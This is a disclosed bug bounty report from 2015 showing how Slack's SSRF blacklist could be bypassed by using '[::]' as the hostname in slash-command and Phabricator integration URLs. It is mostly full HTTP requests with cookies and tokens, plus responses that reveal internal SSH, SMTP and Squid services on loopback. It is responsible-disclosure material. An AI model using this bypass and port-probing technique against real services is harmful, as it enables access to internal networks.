# Bypass of the SSRF protection (Slack commands, Phabricator integration)

## Report Details
- **Report ID**: 61312
- **URL**: https://hackerone.com/reports/61312
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-05-11T21:42:32.614Z
- **Disclosed**: 2016-09-14T20:38:17.068Z

## Reporter
- **Username**: agarri_fr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
# Abstract

Some Slack features like "Integrations / Phabricator" and "Integration / Slash Commands" allow users to submit URL that will be accessed by the backend servers. A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, ...). This blacklist can be bypassed using "[::]" as the hostname. Only services binding all the interfaces and supporting IPv6 can be reached using that vector.

# Integration features

## Slack commands

Modify the "url" property of the "/ssrf" Slack command (with "http://[::]:25/" as the destination)

    POST /services/4814366410 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://agarri.slack.com/services/4814366410?updated=1
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 148
    
    crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label=

Execute the Slack command "/ssrf"

    POST /api/chat.command?t=1431286754 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Referer: https://agarri.slack.com/messages/general/
    Content-Length: 133
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache
    
    agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1

Access port TCP/25 on loopback

    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: *
    Cache-Control: private, no-cache, no-store, must-revalidate
    Content-Type: application/json; charset=utf-8
    Date: Mon, 11 May 2015 20:28:06 GMT
    Expires: Mon, 26 Jul 1997 05:00:00 GMT
    Pragma: no-cache
    Server: Apache
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Vary: Accept-Encoding
    X-Accepted-OAuth-Scopes: post
    X-Content-Type-Options: nosniff
    X-OAuth-Scopes: identify,read,post,client,admin
    X-XSS-Protection: 0
    Content-Length: 120
    Connection: keep-alive
    
    {"ok":true,"response":"220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0 Error: I can break rules, too. Goodbye.\r\n"}

## Phabricator

This vector is very similar to the previous one. If the port is opened, a HTTP 302 code is received. If not, an error 500 is generated. Outside of that, this vector is blind.

Request for http://[::]:22/

    POST /services/4836378801 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://agarri.slack.com/services/4836378801?updated=1
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 132
    
    edit_service=1&edit_label=1&phabricator_url=http://[::]:22/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1

302 Found

    HTTP/1.1 302 Found
    Content-Type: text/html
    Date: Mon, 11 May 2015 20:16:02 GMT
    Location: /services/4836378801?updated=1
    Server: Apache
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Vary: Accept-Encoding
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0
    Connection: keep-alive

Request for http://[::]:11/

    POST /services/4836378801 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://agarri.slack.com/services/4836378801?updated=1
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 132
    
    edit_service=1&edit_label=1&phabricator_url=http://[::]:21/&conduit_user=Yolo&conduit_cert=foobar&import_phriction=1&import_pastes=1

500 Error

    HTTP/1.1 500 Server Error
    Cache-Control: private, no-cache, no-store, must-revalidate
    Content-Type: text/html; charset=utf-8
    Date: Mon, 11 May 2015 20:22:11 GMT
    Expires: Mon, 26 Jul 1997 05:00:00 GMT
    Pragma: no-cache
    Server: Apache
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Vary: Accept-Encoding
    X-Frame-Options: SAMEORIGIN
    X-XSS-Protection: 0
    Content-Length: 32657
    Connection: keep-alive
    
    <snip>

# Identified services

SSH on TCP/22

    SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
    Protocol mismatch.

SMTP on TCP/25

    220 squid3.tinyspeck.com ESMTP Postfix
    221 2.7.0 Error: I can break rules, too. Goodbye.

Squid on TCP/3128


    [...]
    <h1>ERROR</h1>
    <h2>The requested URL could not be retrieved</h2>
    [...]
    <p>The following error was encountered while trying to retrieve the URL: <a href="/?token=wW0Mjd9kSTPzazuTzHPkLNpI&team_id=T04QDFHL9&team_domain=agarri&channel_id=C04QDFHLT&channel_name=general&user_id=U04QDFHLB&user_name=nico&command=/ssrf&text=">/?token=wW0Mjd9kSTPzazuTzHPkLNpI&team_id=T04QDFHL9&team_domain=agarri&channel_id=C04QDFHLT&channel_name=general&user_id=U04QDFHLB&user_name=nico&command=/ssrf&text=</a></p>
    <blockquote id="error">
    <p><b>Invalid URL</b></p>
    </blockquote>
    [...]
    Generated Mon, 11 May 2015 20:34:46 GMT by localhost (squid\/3.1.19)
    [...]





## Attachments
No attachments
